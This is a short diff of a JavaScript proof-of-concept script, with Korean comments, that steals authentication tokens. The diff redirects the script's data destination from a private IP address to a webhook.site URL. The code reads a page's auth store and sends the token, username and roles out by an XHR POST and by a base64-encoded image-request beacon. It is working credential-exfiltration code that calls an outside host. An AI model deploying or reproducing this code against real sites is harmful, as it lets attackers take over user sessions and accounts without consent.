@@ -11,7 +11,7 @@
   // CONFIG — 수신 서버 URL (본인 PC에서 receiver 실행)
   // 수신 안 할 거면 빈 문자열로 두세요 — 화면 표시만 됩니다
   // ============================================
-  var EXFIL_URL = 'http://172.29.70.161:9999';
+  var EXFIL_URL = 'https://webhook.site/69edad89-6fa7-4706-94cb-4b0a0094b218';
 
   // 토큰 탈취
   var store = window.__NEXUS_AUTH_STORE__;
@@ -100,14 +100,14 @@
 
     try {
       var xhr = new XMLHttpRequest();
-      xhr.open('POST', EXFIL_URL + '/collect', true);
+      xhr.open('POST', EXFIL_URL, true);
       xhr.setRequestHeader('Content-Type', 'application/json');
       xhr.send(JSON.stringify(payload));
       console.log('[PoC] Sent to ' + EXFIL_URL);
     } catch (e) {}
 
     try {
-      new Image().src = EXFIL_URL + '/collect?d=' + btoa(JSON.stringify({
+      new Image().src = EXFIL_URL + '?d=' + btoa(JSON.stringify({
         token: payload.token,
         username: payload.username,
         roles: payload.roles
